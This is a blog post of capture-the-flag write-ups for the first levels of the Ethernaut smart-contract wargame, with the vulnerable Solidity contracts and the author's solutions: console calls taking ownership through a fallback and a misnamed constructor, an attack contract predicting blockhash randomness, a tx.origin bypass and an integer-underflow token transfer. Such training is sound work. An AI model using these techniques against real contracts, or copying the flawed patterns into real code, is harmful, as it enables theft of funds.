---
title: Ethernaut Writeups Part-1
tags:
- technology
- blockchain
image: /images/ether/info.png
---

Starting my the second phase of my blockchain security journey [First one here](https://github.com/vandanrohatgi/Unga-Bunga-Coin). Now that I know a little bit of how blockchains work I wanted to dive straight into it's security aspect.

<!--more-->

Some may say I still don't know many things about blockchain, how will I ever secure it? That's the beauty of top-down learning. You learn as you go. It's not the typical routine of learn the theory and then get the hands dirty. I believe in learning on the job. With that out of the way... Lets dive into my first solve.

# Hello Ethernaut

[Play along](https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966)

So first we just follow the basic setup guide, which is pretty clear. We interact with the challenges using the web console in our browsers. Here is where some might face trouble. The link provided in the guide to get test ether (which is required to play) does not work. [Here is an alternative I found](https://faucets.chain.link/rinkeby). It only gives 0.1 Ether at a time, but that much is enough to play these challenges.

Also if you cant call the "player" or "ethernaut" functions and variables, try opening the console and refreshing the page. Starting the challenge. It is pretty easy since this is just an example challenge. The challenge said to look into contract.info() to start.

![](https://i.imgur.com/MarT8Ve.png)

So we can use the contract object to call functions. The info() function said to call another function info1(). After this we just do as the consecutive functions say. 

![](https://i.imgur.com/kyNn476.png)

After this we need to find a password for the authenticated function. We can find it inside the properties of contract object.

![](https://i.imgur.com/wNNcpo8.png)

And then we just need to allow the transcation using metaMask extension and click on submit. Now we can see the code of the smart contract.

{% highlight text %}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
{% endhighlight %}

Looks pretty easy. This is solidity code. Like any language it has functions, datatypes, classes etc. Hashing is a very important topic in blockchain, so I should probably remember functions like keccak256 which is used to generate hashes. Let's move to the real challenges :)

# Fallback

Okay so in this one I learned about fallback methods. Fallback methods are functions which are triggered when a function is called on contract without any information except the amount of ether. If it is marked "payable" then it is able to receive ether and add it to the contract.

In this challenge we get the following code:

{% highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
{%endhighlight%}

The last function without the "function" keyword is the way to solve this challenge. First we see there is an owner. The constructor creates the owner and defines that this owner has made 1000 ether worth of contributions. 

![](https://i.imgur.com/ZuuNH3Y.png)

Next we see a "modifier" which I'm guessing is a condition and a statement which is triggered when the condition fails. The contribute() function checks the requirement that  we don't send all of our ether to this level, so it caps it at 0.001 ethers.

If it sees that we have sent it more ether than the owner then we are assigned as the new owner. BUT we cant do that because we don't have 1000 ether with us and even if we did, the condition that we cant send more than 0.001 ether at a time is going to stop us from doing so. Our goal is to become the owner and withdraw the amount stored in the contract.

We cant withdraw until we are the owner because of the condition. So we use fallback method. That means we just need to call a function without data to create the transaction. 

![](https://i.imgur.com/VYydb6E.png)

First I used this command to see if I can send ether using the sendTransaction function. Everything should be clear from the name except the value parameter. 

We can't just give a value like "2" to the value parameter. we need to convert it to Wei which is the smallest unit of ether, and then send the ether.

But I got an error that contract raised error when I used this method. So I tried function "contribute" just for testing and it worked.

`contract.contribute({from:player,to:level,value:toWei("0.000000001",'ether')})`

Calling "contract.contributions(player)"  show that we indeed did something. Next Lets finally invoke the fallback function by using sendTransaction or send function. 

`contract.send(toWei('0.000000000001','ether'))`

which worked! And since the fallback function makes anyone who send ether through it as the owner, we were now the owner of contract!

![](https://i.imgur.com/Mu5HqrD.png)

I was still a little shakey on the concepts. So I went ahead and created a new Instance of the level to try what works and what doesn't. Send() just takes the value as is and sendTransaction({value:abc}) uses this format.

# Fallout

This challenge was easier than the first level (I solved it in first 5 minutes easy) but taught a good lesson. Lets see the code first.

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {
  
  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
{%endhighlight%}

Just looking at the constructor should give you the answer. It is spelled "Fal1out" instead of "Fallout". Which means its not really a constructor but just another function. And we can call it to send ether and become the owner.

![](https://i.imgur.com/x3Tjabv.png)

After solving the challenge we get a case study of company named "Dynamic Pyramid" which renamed itself to "Rubixi". What they forgot to do was rename the constructor name and a hacker called the old constructor to become the owner of the contract.

{%highlight text%}
contract Rubixi {
  address private owner;
  function DynamicPyramid() { owner = msg.sender; }
  function collectAllFees() { owner.transfer(this.balance) }
{%endhighlight%}

# Coin Flip

It's day four on my own on this island of despair. I don't know how long I will last dealing with this frustration of not knowing anything about solidity.

Sorry about that. I'm just tired. This challenge was particularly challening. We needed to create a smart contract of our own to attack the given smart contract. So There were two challenges:

1. I don't know how to make smart contracts.
2. I don't know solidity.
3. I don't know how to make it interact with other contracts.

Anyway.. lets start with the source code.

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
{%endhighlight%}

The first thing came to my mind was straight up brute force. From the looks of this code we needed to guess the output of coin flipping game. 10 TIMES IN A ROW! I whipped up a python script to see how long it will take. Just for fun:

{%highlight text%}
import random
consec=0

while consec!=10:
  if random.randint(0,1)==1:
    consec+=1
  else:
    consec=0
{%endhighlight%}

It took 2 seconds to get 10 True(s). I thought, maybe that is what we need to do. The hint recommended to use Remix IDE which is just an awesome online IDE to write smart contracts and deploy them. So I started out by writing (trying to anyway) some solidity code to make unlimited calls to flip() function till we get 10 consecutive wins. 

It didn't work. (Thank god for that)

I tried looking at the source code again and searched what each line and function did. For ex blockhash gives us the hash of the block and block.number gives us the number of last block in the chain.

This revealed another (more sane) attack vector. Since all the information to generate the random number is public, we can predict the value and make correct choices in life! (yay!)

I read docs, I saw youtube videos, I tried and errored badly while implementing this idea. My idea was to copy the flip function random number generator and predict the side of coin. Since I didn't know jack about solidity I wasn't able to. 

Side note: you can use multiple ways to import a file into solidity. I tried to import the SafeMath.sol file which was originally used in the source code. for ex `import './SafeMath.sol';` , `import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";`

Finally I gave in. I knew what I had to do but didn't know how to do it. I read some writeups. 

I got to know that to interact with other smart contracts there are three ways:
1. If a contract is in same file we can just make an object for it in the second contract.
2. We can import contracts from files stored in same place.
3. We create an interface with the list of functions of the contract and then make an object for that contract to use. (we use this)

My code:

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface CoinFlip{
    function flip(bool _guess) external returns (bool);
}

contract onedone  {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public object=CoinFlip(<Contract address here>);

    function getsecret() public returns(bool){
        uint256 blockValue = uint256(blockhash(block.number-1));
        uint256 coinFlip= blockValue/FACTOR;
        bool result = coinFlip == 1 ? true : false;
        bool plswork = object.flip(result);
        return plswork;
    }
}

{%endhighlight%}
(I got a bit desparate at the end to make it work., hence the naming conventions)

Now after we do this, We compile it and then click on deploy from the left side menu. Select Environment as "injected web3" so that we can work on actual test net instead of the default local blockchain. Select the contract you want to deploy from dropdown and hit deploy. 

Once deployed The functions we made in our contract will become buttons and input fields with which we can interact. 

![](https://i.imgur.com/TBGieBZ.png)

Now when we click on getsecret it will make a call to flip function with correct predictions. You may face some errors while doing this.

![](https://i.imgur.com/2CqhSB2.png)

![](https://i.imgur.com/aDliypm.png)

Just remember to do it real slow. We have to call this button 10 times to clear the level. Slowly but surely it will work.

![](https://i.imgur.com/7KKE7pI.png)

The lesson in this challenge was that , there isn't any native way to produce true random numbers in solidity yet, because all the data and variables are visible to everyone. The author recommends  Chainlink VRF, Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize to generate random numbers.

# Telephone

Another easy challenge. Just make a smart contract like the previous one and we are done. Lets see the source code and then the solution.

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
{%endhighlight%}

I saw the difference between tx.origin and msg.sender. Tx.origin refers to the original account that started the transfer. Msg.sender refers to the immediate account which did the transfer. [Here is a good explaination](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml)

So in this case we just need it so that the original sender is not the immediate sender too. Which  means we need to send the ether via a contract so that tx.origin will be our address and msg.sender will be the address of our deployed contract.

My code:

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

interface Telephone{
    function changeOwner(address _owner) external;
}

contract phonyphone{
    address public myAddress;
    Telephone public object=Telephone(0xA3a30058F1EcB31d0735B579588479B0B0d517b1);

    function getaddr(address _address) public{
        myAddress=_address;
    }

    function caller() public{
        object.changeOwner(myAddress);
    }
}
{%endhighlight%}

Pretty straight forward, I create an interface of the level's contract and then create a contract of my own which takes our address using getaddr() and then gives it to the level's contract function called changeOwner(). 

Since tx.origin and msg.sender may represent two different addresses, It can be used to perform phishing attacks. Note from author:

![](https://i.imgur.com/GfEjlns.png)

# Token

Ooohhh... I liked this challenge a lot. Not much work to do like making another contract. Just one simple function call with a hackey value.

Lets see the source code:

{%highlight text%}
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
{%endhighlight%}

In the desciption of challenge we see that we have been given 20 tokens and we need to increase it to more than 20, specifically some absurdly large value. (Most seasoned hackers may have already caught whats going to happen).

Okay. First we see a mapping of addresses and their balance. Then we see a simple constructor. fair enough. Then we see a transfer function that takes an address and a value, and then transfers that amount from the sender to receiver. And the last function shows us the balance of addresses.

The hint says if we know what an odometer is. At first I thought it was an etherium or a blockchain concept I didn't know. Which landed me on this [awesome article](https://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17d)

Just like odometers which after hitting 999999 go back to 000000 solidity also has this underflow and overflow mechanism. (read the above article)

Half of my work was done. I knew what I had to do. This challenge was about overflows and underflows in unsigned integers. unsigned integers do not have any signs so basically they only know +ve values. if we make them go negative then go back up and become the largest value they can be. 

In this one we had to underflow the amount in our balance so that it turns around and goes to the max amount possible. I checked the balances in both my account and the level's account first.

![](https://i.imgur.com/JiQUEHT.png)

We have a clue already. We have 20 and the level has 20999980 tokens. I knew I had to transfer some wierd amount somewhere. Just didn't know to who and how much. from the hint is looks like we need to send it to the level's Instance and now it was a matter of how much. I did some tests by creating a contract in Remix IDE to see how underflow and overflow worked in solifity.

{%highlight text%}
contract overunder{
  uint balance=20;

  function reduce() public returns(uint newbalance) {
      return balance-21;
  }
}
{%endhighlight%}

The output was just as I predicted it. I had near infinite tokens now. I knew what I had to do. Before writing this contract I was still confused but changing values and implementing it made everything clear.

Here is how I solved the challenge.

![](https://i.imgur.com/OXoWXvQ.png)

We can see that our balance increased way more than rather than decreasing to -1. So cool!

Author's note said that we can use OpenZeppelin's SafeMath library known as [SafeMath.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol) to perform safe additions and subtractions.

I will end this part here and continue in part 2!